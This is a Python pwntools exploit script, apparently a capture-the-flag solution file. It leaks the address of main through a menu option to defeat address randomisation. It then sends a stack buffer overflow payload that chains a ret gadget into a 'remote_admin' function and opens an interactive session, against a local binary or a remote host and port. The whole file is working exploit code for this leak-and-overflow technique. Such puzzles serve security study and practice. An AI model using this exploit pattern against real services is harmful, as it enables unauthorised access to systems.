#!/bin/python

from sys import argv, exit
from pwn import ELF, context, gdb, p64, process, remote


MAIN_BASE_ADDR = 0x1264
REMOTE_ADMIN_BASE_ADDR = 0x124E

# trouvé manuellement, parce que ROPGadget et pwntools me donnaient une addresse qui ne marchait pas (voir writeup)
RET_GADGET_BASE_ADDR = REMOTE_ADMIN_BASE_ADDR + 21


def extract_addr(input: str) -> int:
    addr = input.split("address : 0x")[1]
    addr = addr.split("\n")[0]
    return int(addr, 16)


def pwn(p: remote | process):
    # ---[Extract offset]---
    p.recvuntil(b"faire: ")

    p.sendline(b"9")

    input = p.recvuntil(b"\n\n").decode()
    main_addr = extract_addr(input)

    offset = main_addr - MAIN_BASE_ADDR

    print(f" \\___{{ main's address : {hex(main_addr)}")
    print(f"     \\___{{ offset : {hex(offset)}")

    remote_addr = REMOTE_ADMIN_BASE_ADDR + offset
    print(f" \\___{{ remote_admin's address : {hex(remote_addr)}")

    # ---[Send payload]---
    p.recvuntil(b"faire: ")
    p.sendline(b"2")
    p.recvuntil(b"release: ")

    ret_remote = RET_GADGET_BASE_ADDR + offset  # for stack alignement
    print(f" \\___{{ ret gadget's address : {hex(ret_remote)}")

    payload = b"A" * 64 + b"B" * 8 + p64(ret_remote) + p64(remote_addr)

    p.sendline(payload)

    # ---[profit]---
    p.interactive()


if __name__ == "__main__":
    try:
        mode = argv[1]
        if mode == "remote" or mode == "r":
            p = remote(argv[2], argv[3])
        elif mode == "local" or mode == "l":
            p = process(argv[2])

        elif mode == "debug" or mode == "d":
            context.terminal = (
                "kitten @ launch --location=before --cwd=current --bias=65".split()
            )

            p = gdb.debug(argv[2], "b main", env={"SHELL": "/bin/bash"})

            # find base address of main and of remote_admin
            b = context.binary = ELF(argv[2])
            print(
                f" \\___{{ remote_admin's base address : {hex(b.symbols['remote_admin'])}"
            )
            print(f" \\___{{ main's base address : {hex(b.symbols['main'])}")
        else:
            raise ValueError("wrong arguments")

        pwn(p)

    except (IndexError, ValueError):
        print(
            "Usage : python solve.py remote <ip> <port> or python solve.py local <program_name>"
        )
        exit(1)
